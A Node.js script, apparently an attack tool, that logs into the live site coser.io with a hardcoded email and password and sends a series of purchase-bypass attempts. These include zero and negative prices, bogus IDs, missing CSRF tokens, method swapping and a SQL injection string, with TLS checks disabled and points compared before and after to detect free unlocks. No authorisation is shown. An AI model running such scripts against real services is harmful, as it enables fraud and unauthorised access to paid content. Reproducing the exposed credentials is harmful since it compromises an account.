// coser.io business logic bypass tests
// Testing multiple attack vectors against the purchase API
const https = require('https');

let cookies = {};
function getCookieStr() {
  return Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
}

function req(opts) {
  return new Promise((resolve, reject) => {
    const { URL } = require('url');
    const p = new URL(opts.url);
    const r = https.request({
      hostname: p.hostname, port: 443, path: p.pathname + p.search,
      method: opts.method || 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 Chrome/123',
        'Cookie': getCookieStr(),
        'Content-Type': 'application/json',
        ...(opts.headers || {})
      },
      rejectUnauthorized: false
    }, (res) => {
      (res.headers['set-cookie'] || []).forEach(h => {
        const parts = h.split(';')[0].trim().split('=');
        if (parts.length >= 2) cookies[parts[0]] = parts.slice(1).join('=');
      });
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    r.on('error', reject);
    if (opts.body) r.write(typeof opts.body === 'string' ? opts.body : JSON.stringify(opts.body));
    r.end();
  });
}

async function main() {
  console.log('=== coser.io 积分绕过测试 ===\n');

  // Step 1: Login
  console.log('Step 1: 登录...');
  const r1 = await req({ url: 'https://coser.io/login.html' });
  const csrfMatch = r1.body.match(/__csrfToken\s*=\s*['"]([^'"]+)['"]/);
  const csrf = csrfMatch ? csrfMatch[1] : '';

  const loginResp = await req({
    url: 'https://coser.io/web-api/v1/user/login',
    method: 'POST',
    body: { email: 'atlascrfat@outlook.com', password: 'YH86JzhrSBd4nP3' },
    headers: { 'csrf-token': csrf }
  });
  console.log(`  登录: ${loginResp.body.substring(0, 100)}`);

  // Step 2: Check points
  console.log('\nStep 2: 检查积分...');
  const pointsResp = await req({ url: 'https://coser.io/web-api/v1/user/points' });
  console.log(`  积分: ${pointsResp.body.substring(0, 200)}`);

  // Step 3: Try various purchase bypass vectors
  console.log('\nStep 3: 测试购买 API 绕过向量...\n');

  // BL-04: Price tampering - try price=0
  console.log('  BL-04a: 价格为0...');
  const r04a = await req({
    url: 'https://coser.io/purchase/gallery',
    method: 'POST',
    body: { id: 69218, type: 'gallery_view', price: 0 },
    headers: { 'csrf-token': csrf }
  });
  console.log(`    ${r04a.body.substring(0, 200)}`);

  // BL-04b: No id/special id  
  console.log('  BL-04b: 空/特殊ID...');
  const r04b = await req({
    url: 'https://coser.io/purchase/gallery',
    method: 'POST',
    body: { id: 0, type: 'gallery_view' },
    headers: { 'csrf-token': csrf }
  });
  console.log(`    ${r04b.body.substring(0, 200)}`);

  // BL-04c: Negative price
  console.log('  BL-04c: 负价格...');
  const r04c = await req({
    url: 'https://coser.io/purchase/gallery',
    method: 'POST',
    body: { id: 69218, type: 'gallery_view', price: -1 },
    headers: { 'csrf-token': csrf }
  });
  console.log(`    ${r04c.body.substring(0, 200)}`);

  // BL-07: Try to access already-unlocked content (type=already_purchased)
  console.log('  BL-07a: 重复解锁...');
  const r07a = await req({
    url: 'https://coser.io/purchase/gallery',
    method: 'POST',
    body: { id: 69218, type: 'gallery_view' },
    headers: { 'csrf-token': csrf }
  });
  console.log(`    ${r07a.body.substring(0, 200)}`);

  // Try without CSRF
  console.log('  BL-07b: 无CSRF...');
  const r07b = await req({
    url: 'https://coser.io/purchase/gallery',
    method: 'POST',
    body: { id: 69218, type: 'gallery_view' }
  });
  console.log(`    ${r07b.body.substring(0, 200)}`);

  // Try GET method on POST endpoint
  console.log('  BL-07c: GET 替代 POST...');
  const r07c = await req({
    url: 'https://coser.io/purchase/gallery?id=69218&type=gallery_view',
    method: 'GET',
    headers: { 'csrf-token': csrf }
  });
  console.log(`    ${r07c.body.substring(0, 200)}`);

  // Try different type
  console.log('  BL-07d: 无效 type...');
  const r07d = await req({
    url: 'https://coser.io/purchase/gallery',
    method: 'POST',
    body: { id: 69218, type: 'free' },
    headers: { 'csrf-token': csrf }
  });
  console.log(`    ${r07d.body.substring(0, 200)}`);

  // Try SQL injection
  console.log('  BL-07e: SQL注入...');
  const r07e = await req({
    url: 'https://coser.io/purchase/gallery',
    method: 'POST',
    body: { id: '69218 OR 1=1', type: 'gallery_view' },
    headers: { 'csrf-token': csrf }
  });
  console.log(`    ${r07e.body.substring(0, 200)}`);

  // Check final points
  console.log('\nStep 4: 最终积分...');
  const finalPoints = await req({ url: 'https://coser.io/web-api/v1/user/points' });
  console.log(`  积分: ${finalPoints.body.substring(0, 200)}`);

  console.log('\n=== 测试完成 ===');
}

main().catch(e => console.error('Error:', e.message));
